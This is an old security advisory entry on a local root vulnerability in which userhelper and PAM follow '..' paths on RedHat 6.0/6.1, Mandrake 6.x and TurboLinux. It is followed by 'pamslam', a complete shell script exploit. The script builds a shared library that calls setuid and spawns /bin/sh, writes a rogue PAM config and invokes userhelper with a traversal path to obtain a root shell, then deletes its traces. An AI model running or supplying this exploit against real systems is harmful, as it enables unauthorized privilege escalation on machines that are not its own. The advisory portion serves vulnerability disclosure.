Mandrake 6.0/6.1,RedHat 6.0/6.1,Turbolinux 3.5 b2/4.2/4.4/6.0.2 userhelper/PAM Path Vulnerability (1)

source: http://www.securityfocus.com/bid/913/info

Because of double path vulnerabilities in the binary userhelper and PAM, it is possible to get root locally on RedHat 6.0 and 6.1 systems. Both userhelper and PAM follow ".." paths and userhelper allows you to specifiy a program to execute as an argument to the -w parameter (which is expected to have an entry in /etc/security/console.apps). Because of this, it's possible to specifiy a program such as "../../../tmp/myprog", which would (to userhelper) be "/etc/security/console.apps/../../../tmp/myprog". If "myprog" exists, PAM will then try to execute it (with the same filename). PAM first does a check to see if the configuration file for "../../../tmp/myprog" is in /etc/pam.d/ but also follows ".." directories -- to an attacker's custom pam configuration file. Specified inside the malicious configuration file (/tmp/myprog) would be arbitrary shared libraries to be opened with setuid privileges. The arbitrary libraries can be created by an attacker specifically to compromise superuser access, activating upon dlopen() by PAM.

This vulnerability also affects Mandrake Linux versions 6.0 and 6.1, as well as versions of TurboLinux Linux, version 6.0.2 and prior.


#!/bin/sh
#
# pamslam - vulnerability in Redhat Linux 6.1 and PAM pam_start
# found by dildog@l0pht.com
#  
# synopsis:
#    both 'pam' and 'userhelper' (a setuid binary that comes with the
#    'usermode-1.15' rpm) follow .. paths. Since pam_start calls down to
#    _pam_add_handler(), we can get it to dlopen any file on disk. 'userhelper'
#    being setuid means we can get root. 
#
# fix: 
#    No fuckin idea for a good fix. Get rid of the .. paths in userhelper 
#    for a quick fix. Remember 'strcat' isn't a very good way of confining
#    a path to a particular subdirectory.
#
# props to my mommy and daddy, cuz they made me drink my milk.

cat > _pamslam.c << EOF
#include<stdlib.h>
#include<unistd.h>
#include<sys/types.h>
void _init(void)
{
    setuid(geteuid());
    system("/bin/sh");
}
EOF

echo -n .

echo -e auth\\trequired\\t$PWD/_pamslam.so > _pamslam.conf
chmod 755 _pamslam.conf

echo -n .

gcc -fPIC -o _pamslam.o -c _pamslam.c

echo -n o

ld -shared -o _pamslam.so _pamslam.o

echo -n o

chmod 755 _pamslam.so

echo -n O

rm _pamslam.c
rm _pamslam.o

echo O

/usr/sbin/userhelper -w ../../..$PWD/_pamslam.conf

sleep 1s

rm _pamslam.so
rm _pamslam.conf